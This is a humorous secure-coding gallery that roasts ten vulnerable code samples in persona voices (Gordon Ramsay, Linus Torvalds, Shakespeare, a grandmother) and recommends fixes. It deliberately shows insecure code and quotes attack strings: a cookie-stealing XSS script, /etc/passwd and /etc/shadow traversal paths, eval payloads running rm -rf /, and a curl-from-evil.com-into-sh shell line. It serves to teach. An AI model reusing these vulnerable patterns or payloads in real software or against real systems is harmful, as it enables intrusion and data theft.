# Security Horrors 🔓

A gallery of security crimes and the roasts they inspired. Read these before your next auth code review.

---

## Horror #1: SQL Injection via String Concatenation

**The crime:**
```python
def get_user(username):
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    return db.execute(query).fetchone()
```

### 🧑‍🍳 Gordon Ramsay — Savage

WHAT IS THIS?! You've taken user input — UNTRUSTED, UNVALIDATED, POSSIBLY WRITTEN BY A CRIMINAL — and you've DUMPED IT DIRECTLY into a SQL query like it's STOCK going into a pot! `"' OR '1'='1` and the whole database is ON THE STREET!

This is the FIRST vulnerability on the OWASP Top 10. The FIRST ONE! It's been number one since 2003! That's older than some of your JUNIOR DEVELOPERS! And you're STILL DOING IT?!

Parameterized queries! PREPARED STATEMENTS! The database driver WANTS to help you! It's BEGGING you! Pass the username as a PARAMETER, not as STRING CONCATENATION! You wouldn't glue a piece of raw fish to a plate and call it sashimi, WOULD YOU?! THEN DON'T GLUE USER INPUT TO YOUR QUERIES!

GET. OUT. OF. MY. DATABASE!

### 👵 Gentle Grandma — Medium

Oh honey, sit down. I brought the good biscuits because we need to have a serious talk.

You're... concatenating the username into the SQL string. Directly. With a plus sign. Sweetheart, I learned not to do that in 1987 when I was still writing COBOL on a terminal that weighed more than my refrigerator. It was called "injection" then too. The word hasn't changed. The defense hasn't changed either — parameterized queries, dear. Placeholders. The database library does the escaping for you, properly, every time.

If someone types `'; DROP TABLE users;--` into your login form, your users table goes to the big database in the sky. And then you have to explain to your CEO why everyone's account is gone. And then the CEO calls the board. And the board calls the insurance company. And the insurance company calls a lawyer. And the lawyer calls your mother, somehow, because lawyers know how to find mothers.

Please use `?` placeholders, sweetie. I'm going to call your cousin Kevin. He wrote a lovely little ORM tutorial on his blog last month. I'll forward it to you.

---

## Horror #2: Passwords Stored in Plaintext

**The crime:**
```javascript
async function register(email, password) {
  await db.users.insert({
    email: email,
    password: password,  // just... like that
    created_at: Date.now()
  });
}
```

### 🐧 Linus Torvalds — Savage

NACK. Not going to mince words.

You have written a registration function that takes a plaintext password and writes it directly to the database. No hash. No salt. No KDF. Just the password, sitting in a column called `password`, in clear bytes, readable by anyone with `SELECT` privileges, anyone who steals a backup, anyone who dumps a table in a debugger, anyone who reads your logs if the query ends up in one.

This is not an implementation choice. This is not a "we'll fix it later." This is a **breach waiting for a timestamp.** The moment someone gets read access to that table — through a SQLi, a leaked backup, a disgruntled intern, a misconfigured S3 bucket — every one of your users' passwords is now a commodity. And because users reuse passwords (they do, stop pretending they don't), you have not just breached your own site. You have breached their bank, their email, their employer's VPN.

bcrypt. argon2id. scrypt. Pick one. These have existed for *decades*. The algorithm does not care which one you pick — just pick one that is memory-hard and has a tunable work factor. Store the hash. Store the salt (the library does this for you, in the same string, like a civilized person). Never — *never* — touch the raw password again after the hash is computed.

I shouldn't have to write this email in 2026. Do better.

### 🎭 Shakespeare — Medium

*[Enter DATABASE, weeping]*

O most pernicious villainy! What man, what wretch,
What modern scribe with keyboard in his hand,
Would take a password — secret, sacred trust —
And write it plainly, naked on the page?
'Tis not a *password* once 'tis writ in full:
'Tis but a **password printed on the wall.**

Hast thou not heard of bcrypt, gentle fool?
Of argon2, whose very name doth sing
Of salt and iteration, work and cost?
A hash is to a password as a grave
Is to the dead: once buried, none retrieve it,
And yet on Judgment Day — *a login form* —
The match is made by likeness, not by touch.

Compare, compare! With hash, and not with plain!
For every database shall one day leak,
And when it does, what shalt thou tell thy users?
*"Forsooth, your passwords now belong to Russia"?*

Rewrite this function. Now. Before the dawn.

---

## Horror #3: Math.random() for Security Tokens

**The crime:**
```javascript
function generateSessionToken() {
  return Math.random().toString(36).substring(2);
}

function generatePasswordResetLink(userId) {
  const token = Math.random().toString(36).substring(2);
  return `https://example.com/reset?token=${token}&user=${userId}`;
}
```

### 🧑‍🍳 Gordon Ramsay — Savage

`Math.random()`?! FOR A SECURITY TOKEN?! Are you HAVING A LAUGH?!

`Math.random()` is a PSEUDO-random number generator designed for JIGGLING PARTICLES IN A VIDEO GAME! It's not cryptographically secure! It's not even TRYING to be! The V8 engine documentation LITERALLY SAYS "do not use for security!" It's written RIGHT THERE! In the docs! In BOLD!

And you're using it for PASSWORD RESET LINKS?! So when an attacker sees ONE of your tokens, they can PREDICT the NEXT ONE! They can reset ANY USER'S PASSWORD! They can take over ACCOUNTS at a rate of ONE PER MILLISECOND!

`crypto.randomBytes(32).toString('hex')`! It's ONE LINE! It's BUILT INTO NODE! It's been there FOR A DECADE! You didn't even have to install a package! The answer was SITTING IN THE STANDARD LIBRARY like a perfect SEARED SCALLOP waiting to be plated, and you reached past it for a MICROWAVE DINNER!

I'm shutting the kitchen. THE WHOLE KITCHEN. DONE.

### 👵 Gentle Grandma — Savage

*[sets down tea with a tremor]*

Sweetheart. Dear. My precious grandchild of code. I retired from IBM in 2003, and even on a mainframe running *RACF* — which predates you by several decades — we did not use linear congruential generators for authentication tokens. We *knew*, dear. We knew in 1979. We have KNOWN.

`Math.random()` is not random in the sense that matters. It is *statistically distributed*. That is a completely different thing. A die is random; a deck of cards that's been shuffled 52 times is random. `Math.random()` is a *predictable sequence* that merely *looks* random to the naked eye. To an attacker with a laptop and half a weekend, the sequence is an *open book*.

And you've built your PASSWORD RESET LINKS on it. Password reset. The single most sensitive flow in your entire application. The one that bypasses the password entirely. You've secured it with a function designed for making the leaves in a browser game drift slightly differently each autumn.

I am calling your mother. I am calling CERT. I am calling your cousin Kevin, who last week gave a talk titled "Why `crypto.getRandomValues()` Exists And Why You Must Use It." He will send you his slides. You will read them. You will fix this before I finish my chamomile.

Do you hear me, darling? Before I finish my chamomile.

---

## Horror #4: Hardcoded API Keys in Source

**The crime:**
```python
# stripe_client.py
import stripe

stripe.api_key = "sk_live_REDACTED_EXAMPLE_KEY_DO_NOT_USE"
AWS_SECRET = "AWS_SECRET_REDACTED_EXAMPLE_VALUE_DO_NOT_USE"
OPENAI_KEY = "sk-REDACTED_EXAMPLE_KEY_DO_NOT_USE"

def charge_customer(customer_id, amount):
    return stripe.Charge.create(
        amount=amount,
        currency="usd",
        customer=customer_id
    )
```

### 🐧 Linus Torvalds — Medium

Let me save you some time. Your API keys are already compromised.

Not "will be." *Are.* The moment you `git add`'d this file, those keys became public in every clone of the repo, every CI log that cats the file, every Docker image that baked it in, every stack trace that printed the traceback. If this repo has *ever* been pushed to GitHub — even to a private repo that later went public, even to a fork you forgot about — assume those keys are in a scraper's database already. There are bots that do nothing but watch GitHub's event stream for commits matching `sk_live_`.

The fix is not "delete the line and commit." Git remembers. `git log -p` remembers. Force-pushing does not fix a key that was cloned thirty seconds after you pushed it. The fix is:

1. **Rotate the keys.** Now. All of them. Stripe, AWS, OpenAI. Revoke and reissue.
2. **Move secrets to environment variables** or a proper secret manager (AWS Secrets Manager, Vault, Doppler — pick one).
3. **Add pre-commit hooks** (gitleaks, trufflehog) so this never happens again.
4. **Audit your billing.** If `sk_live_` in your Stripe key is real, check for charges you didn't make. If the AWS key is real, check for EC2 instances mining crypto in `us-east-1` that you don't recognize.

This isn't a code style issue. This is an incident. Treat it like one.

### 🎭 Shakespeare — Gentle

*[A QUIET CHAMBER. A scribe discovers a letter, left open upon the desk.]*

Soft! What is this that gleameth in the source?
A key, a secret key, writ plain in ink,
Where all the world may read it as they pass?

Good friend, I do not chide thee in my anger —
I chide thee in my *concern*, which is the deeper cut.
Thou hast embedded in thy very text
The secret word that doth unlock thy vault.
And git, that faithful scribe, hath writ it down
Forever in its ledger, past the reach
Of any force-push or belated shame.

Rotate the keys, sweet coder. Every one.
Then house them in the `.env` of thy machine,
Or better still, in some vault sealed with care.
And set a hook upon thy commits, that they
May never more betray thee thus again.

*Exeunt, with a quiet urgency*

---

## Horror #5: XSS via innerHTML with User Input

**The crime:**
```javascript
function renderComment(comment) {
  const div = document.createElement('div');
  div.innerHTML = `
    <h3>${comment.author}</h3>
    <p>${comment.body}</p>
    <small>${comment.timestamp}</small>
  `;
  document.getElementById('comments').appendChild(div);
}
```

### 🧑‍🍳 Gordon Ramsay — Medium

`innerHTML` with USER INPUT?! You've just opened up a MICHELIN-STARRED XSS RESTAURANT and the attacker is eating for FREE!

Every single one of those template literals — `${comment.author}`, `${comment.body}`, `${comment.timestamp}` — is a LOADED GUN! The moment a user writes `<script>fetch('/api/steal?c='+document.cookie)</script>` as their NAME, every single visitor to your comments page is COOKING that attacker's BACON for them!

`textContent`! Use `textContent`! Or `innerText`! Anything that treats the string as TEXT and not as HTML! Or use a templating library that escapes by default! React, Vue, Svelte — they ALL do this for you! You're using ZERO framework protection and INVITING the attacker to sit at your BEST TABLE!

Now GET THIS XSS OUT OF MY FRONT-END!

### 🐧 Linus Torvalds — Savage

This is basic. This is 1999-basic. This is "I took one web security course and skipped the second lecture" basic.

`innerHTML` parses its input as HTML. That is its *entire purpose*. When you shove `${comment.body}` into an `innerHTML` string, you are telling the browser: *"please treat whatever this user typed as executable markup, including script tags, including onerror handlers, including iframe injections, including everything."* And the browser, obedient as always, does exactly that.

What makes this particularly tiresome is that the fix is free. `textContent` exists. `createTextNode` exists. Every mainstream framework in the last decade escapes by default and *requires extra effort* to be unsafe (`dangerouslySetInnerHTML` in React is literally named to make you stop and think). You had to go out of your way to write code this bad. You had to pick `innerHTML` over every safer alternative.

I don't want a justification. I want a diff. Replace the `innerHTML` block with DOM construction using `textContent`, or use a real template system with auto-escaping. Then grep the rest of the codebase for `innerHTML`, because I guarantee this is not the only one.

---

## Horror #6: Admin Check by Username String Comparison

**The crime:**
```typescript
function isAdmin(req: Request): boolean {
  const username = req.session?.username;
  return username === 'admin' || username === 'root' || username?.endsWith('_admin');
}

app.delete('/api/users/:id', (req, res) => {
  if (isAdmin(req)) {
    db.users.delete(req.params.id);
  }
  res.sendStatus(200);
});
```

### 🎭 Shakespeare — Savage

*[A MOST TRAGICAL FARCE, in which the Kingdom is lost for want of a Role Table.]*

**ACT I — The Coronation**

Behold! A function, `isAdmin` by its name,
Doth claim to guard the gates of sovereign power.
And how doth it discern the rightful king
From every peasant scrawling at the door?
*By reading what they wrote upon their badge.*

O shame! O sorrow! O most risible defense!
The username is `"admin"`? Then they are admin!
The username doth end in `"_admin"`? The throne is theirs!
I could, in thirty seconds, register
An account `"definitely_not_an_admin"` — no —
An account `"i_am_the_real_admin"` — nay, better —
`"jane_admin"`, and LO! the kingdom kneels.

**ACT II — The Deletion**

*[Enter ATTACKER, who hath registered `villain_admin`.]*

He calls the endpoint `DELETE /api/users/:id`.
The guard `isAdmin` glances at his name,
Nods sagely — *"endeth with `_admin`, yea, a lord!"* —
And opens wide the doors. The users die.
The database is empty by the morn.

**ACT III — The Lesson**

There EXISTS a thing most wondrous, called a *role*.
It lives upon a column, or a table,
Or claims embedded in a signed-and-sealed JWT.
It is set by an administrator, not by the user.
It cannot be forged by one's choice of handle.
Use it, coder. Use it ere thy kingdom falls.

*[The stage is strewn with deleted users. Curtain.]*

### 👵 Gentle Grandma — Medium

Oh sweetheart. Come here. Put the laptop down for a moment.

The username is not a permission. The username is a *label the user chose*. Permissions come from an *authorization system* — a role, a group membership, a claim in a token signed by your server. Something the user *cannot set themselves*.

Any user can register with any available username. If your permission check is `username === 'admin'`, then whoever registers first with the username `admin` is your admin. If your check is `username.endsWith('_admin')`, then *anyone willing to add six characters to their name* is your admin. You've put the front door key under a rock labeled "KEY — DO NOT TAKE."

Make a `role` column. Or a `permissions` table. Or use the `groups` claim from your OIDC provider. The user's display name should have *nothing* to do with what they're allowed to do. Absolutely nothing.

Your cousin Kevin wrote a blog post last week called "RBAC in 30 Lines." I'm texting it to you now. Read it, and then we'll have a nice cup of tea.

---

## Horror #7: Path Traversal

**The crime:**
```python
from flask import request, send_file

@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/var/app/uploads/{filename}')
```

### 🧑‍🍳 Gordon Ramsay — Savage

PATH TRAVERSAL! ON A DOWNLOAD ENDPOINT! YOU'VE HANDED THE ATTACKER A FILE EXPLORER FOR YOUR ENTIRE SERVER!

`/download?file=../../../../etc/passwd` — GONE! Password file DOWNLOADED!
`/download?file=../../../../etc/shadow` — GONE! Hashes DOWNLOADED!
`/download?file=../../app/.env` — GONE! YOUR STRIPE KEYS, YOUR AWS SECRETS, YOUR DATABASE PASSWORD — ALL OF IT! On a PLATTER! Served COLD!

Your `send_file` call is just CONCATENATING `filename` to the path! There's no check! No sanitization! No `os.path.abspath()` with a prefix check! No allowlist! You've taken an UNTRUSTED STRING and USED IT AS A FILESYSTEM PATH!

You need an ALLOWLIST of permitted filenames! You need `os.path.realpath()` to resolve `..` segments! You need to CHECK that the resolved path STARTS WITH your uploads directory! You need to REJECT any filename containing `..` or `/` or `\` or a NULL BYTE!

Right now, a curl command and a coffee break is ALL it takes to OWN YOUR SERVER! SHUT. IT. DOWN!

### 🐧 Linus Torvalds — Medium

Three lines. Three lines to expose the entire filesystem.

`send_file(f'/var/app/uploads/{filename}')` — there is no validation of `filename`. A value of `../../../../etc/passwd` resolves, Flask happily reads the file, and returns it. `/proc/self/environ` gives the attacker the process environment (which contains your secrets). `/etc/shadow` gives password hashes if the process has permission to read it (which it shouldn't, but frequently does on lazy deployments).

The correct pattern is:

1. **Allowlist if possible.** Map the input to a known set of files (UUID -> real path in a database).
2. **If paths are user-controlled, resolve and verify.** Use `os.path.realpath()` and check with `os.path.commonpath()` that the resolved path is within the intended base directory. Reject anything else.
3. **Never concatenate user input into a path and pass it to a file API.** Ever.

Also: strip null bytes (`\x00`), because some underlying C calls still truncate on them, which means an input like `safe.txt\x00../../../etc/passwd` can bypass naive suffix checks.

Fix this before the next deploy, not after.

---

## Horror #8: JWT with alg: none Accepted

**The crime:**
```javascript
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  // "Try every algorithm, one will work!"
  return jwt.verify(token, SECRET, {
    algorithms: ['HS256', 'RS256', 'none']
  });
}

app.use((req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  req.user = verifyToken(token);
  next();
});
```

### 🐧 Linus Torvalds — Savage

Let me be precise about what you have done.

You have configured your JWT verifier to accept the `none` algorithm. The `none` algorithm means *"this token has no signature."* By including `'none'` in the `algorithms` array, you are telling the library: *"if an attacker hands you a token with no signature, trust it anyway."*

An attacker crafts a JWT with header `{"alg":"none","typ":"JWT"}`, payload `{"sub":"admin","role":"superuser"}`, and an empty signature. Your verifier runs through the `algorithms` list, sees `none`, notes the token's header says `alg: none`, and returns the payload *as a verified claim*. The attacker is now admin. Every user is whoever they want to be.

This vulnerability has its own Wikipedia section. It's been documented since 2015. Multiple JWT libraries have shipped *specifically to remove this footgun*. The mitigation is a single line: **remove `'none'` from the algorithms list. Pin it to exactly the algorithm you issue tokens with.** Nothing else.

And while you're at it: `algorithms: ['HS256', 'RS256']` is *also* a vulnerability. The RS256/HS256 confusion attack lets an attacker use the public key *as the HMAC secret*. Pick *one* algorithm. Pin it. Don't let the token tell you how to verify itself — that is the entire class of bug here.

Fix immediately. Rotate all existing tokens. Audit logs for authentications that succeeded with anomalous headers.

### 🎭 Shakespeare — Savage

*[A COURT. The KING sits upon his throne. A STRANGER enters, handing a scroll to the GUARD.]*

STRANGER: *"Good guard, behold my writ of passage — signed, as you can see, by no one at all."*

GUARD: *"Forsooth! The writ doth say its signature is `none`,
And my commission bids me honor every `alg`,
Including `none`. Therefore thy writ is good.
Pass freely, friend, and take whate'er thou wilt."*

*[The STRANGER walks to the THRONE, removes the KING, and sits.]*

O HORROR! O MADNESS! O implementation most foul!
Thou hast instructed thy most trusted guard
To honor writs WITH NO SIGNATURE AT ALL
Because the writ ITSELF declared it so!
This is not verification — 'tis *suggestion!*
'Tis asking of the forger, "Art thou honest?"
And taking "yea" for answer, straight to court!

Strike `'none'` from thine algorithms, coward!
Pin thee to ONE, and ONE alone — HS256,
Or RS256 — whichever thou dost issue.
And if a token bears a foreign `alg`,
REJECT it, hurl it from thy battlements,
And let no stranger sit upon thy throne
By reason of a signature that wasn't.

*[The kingdom falls. Thunder. Exeunt.]*

---

## Horror #9: eval() with User Input

**The crime:**
```javascript
app.post('/api/calculate', (req, res) => {
  const { expression } = req.body;
  try {
    const result = eval(expression);
    res.json({ result });
  } catch (e) {
    res.status(400).json({ error: e.message });
  }
});
```

### 🧑‍🍳 Gordon Ramsay — Savage

`eval()`! WITH REQUEST BODY INPUT! ON A PUBLIC API! THIS IS REMOTE CODE EXECUTION AS A SERVICE!

You've built a calculator that accepts `2 + 2`, yes, CHARMING — but it ALSO accepts `require('child_process').execSync('rm -rf /')`! It accepts `process.env` and dumps ALL your secrets to the response! It accepts `require('fs').readFileSync('/etc/passwd', 'utf8')` and reads the password file! IT ACCEPTS ANY JAVASCRIPT AN ATTACKER CAN IMAGINE!

You have not written an API. You have written a SHELL! A SHELL running as YOUR NODE PROCESS, with ALL ITS PERMISSIONS, with ALL ITS NETWORK ACCESS, with ALL ITS FILESYSTEM ACCESS! An attacker can mine CRYPTOCURRENCY on your server! They can pivot to your DATABASE! They can read your ENVIRONMENT VARIABLES and take over EVERY SINGLE SERVICE you integrate with!

`eval` is banned in every linter on the planet for a REASON! If you need an expression evaluator, USE A PROPER LIBRARY! `mathjs`, `expr-eval`, anything SANDBOXED! These parse and evaluate math without executing arbitrary JavaScript!

SHUT. THIS. ENDPOINT. DOWN. DEPLOY THE FIX. NOW. I AM NOT JOKING!

### 👵 Gentle Grandma — Savage

*[sets down the tea untouched]*

Sweetheart. My dear. Listen to Grandma very carefully because I don't say this lightly.

You have built, and deployed, a **remote shell as a public HTTP endpoint**. That is what `eval()` on request body input *is*. Not "a calculator that might be unsafe." Not "a feature that needs hardening." A remote shell. On the internet. Authenticated, I hope? No? Of course not. Unauthenticated.

At IBM, in 1996, we had a junior engineer who did something similar in REXX. He was escorted off the premises within two hours of discovery. Not fired — *escorted.* They took his badge at the door. His manager was also escorted off the premises. I want you to understand that this is not hyperbole; this is the institutional memory of what *adults* used to do when someone shipped RCE on purpose.

And you, darling, put `eval()` in an Express handler. On the public internet. In a production branch.

I am not calling your mother this time. I am calling your *entire security team*. I am calling the on-call engineer, whoever it is, at whatever hour it is. I am calling incident response. I am calling the CISO if you have one and the CEO if you don't. This endpoint needs to be *off* before you read the next sentence.

Go. Deploy the fix. Turn the endpoint off entirely if you have to. Then rotate every credential this server has ever touched, because if an attacker found this in the last week, they own your infrastructure now.

I love you, but I am *so* disappointed.

---

## Horror #10: Debug Endpoints Left in Production

**The crime:**
```python
# Left over from "just temporarily for debugging"
@app.route('/api/debug/run-sql', methods=['POST'])
def debug_run_sql():
    sql = request.json.get('sql')
    return jsonify({'result': list(db.execute(sql))})

@app.route('/api/debug/env')
def debug_env():
    return jsonify(dict(os.environ))

@app.route('/api/debug/eval', methods=['POST'])
def debug_eval():
    return jsonify({'result': str(eval(request.json['code']))})
```

### 🎭 Shakespeare — Savage

*[A CASTLE. Three back doors, each labeled "TEMPORARY — FOR THE KING'S SCRIBES ONLY", stand wide open to the town square.]*

**ACT I — `/api/debug/run-sql`**

O cursed convenience! O deadly shortcut writ!
An endpoint that doth take a stranger's SQL
And runs it on thy sovereign database!
No auth, no allowlist, no ceremony at all —
Just `SELECT * FROM users` from any hand that asks.
`DROP TABLE users` from the same hand, if it please.
A full `UPDATE users SET role='admin' WHERE 1=1` —
And now the villain rules thy very realm.

**ACT II — `/api/debug/env`**

And what is THIS? `/api/debug/env` returneth
Every secret thou hast ever set in env?
Thy database password, plain as morning milk?
Thy Stripe key, thy AWS key, thy session salt?
Dumped as JSON to whomsoever asks?

Even the humblest curl command doth win
More secrets here than ten years' careful theft.

**ACT III — `/api/debug/eval`**

And still a THIRD? Python `eval` on request body?
`__import__('os').system('curl evil.com/shell.sh | sh')`
Returns a Python `None`, and yet the damage
Is done, the shell is spawned, the server's thine
No longer. 'Tis a kingdom three times lost
By one committ, by one forgotten `TODO`.

**EPILOGUE**

"I'll remove it before production" — famous last words,
Writ upon the tombstones of a thousand startups.
Remove them now. This hour. Not when thou canst.
For TEMPORARY, in the tongue of engineering,
Doth mean "until the heat death of the universe."

*[Exeunt all, pursued by a breach notification lawyer.]*

### 👵 Gentle Grandma — Savage

*[places the teacup down with a decisive click]*

No. No, no, no. Sit down. Sit DOWN, young man.

*Three* debug endpoints. In production. Unauthenticated. I have been reading this code for ninety seconds and my blood pressure is on a medical-emergency trajectory.

`/api/debug/run-sql` — a public endpoint that runs arbitrary SQL. That is a **database administration console**. On the internet. Without a password. I want you to look at that sentence and I want you to feel every syllable of it.

`/api/debug/env` — dumps every environment variable. Your database URL. Your Stripe secret. Your AWS access keys. Your OpenAI key. Your session signing secret. All in one neat JSON blob. To anyone. *Anyone.* A bored teenager in any timezone.

`/api/debug/eval` — Python `eval()` on request body. Remote code execution. I covered this one yesterday, dear. You committed it *again*, in *a new file*, under the cheerful name "debug."

At IBM we had a phrase, sweetheart. *"There is no such thing as a temporary debug endpoint. There is only the endpoint you forgot to remove."* We painted it on the wall of the break room in 1988 and I looked at it every morning for fifteen years. I am going to paint it on the wall of *your* apartment if you don't rip these three routes out of the codebase before sundown.

Auth middleware on every `/debug/*` route. Better: a feature flag that disables them entirely outside local development. Better still: **delete them and use a real debugger.** PyCharm has one. VS Code has one. They are *free*. They exist precisely so you do not have to ship RCE as a feature.

Go. *Now.* And when you're done, I want a `grep -r 'debug' .` output on my desk. Every single one. Accounted for.

I am too old for this, darling. I truly am.

---
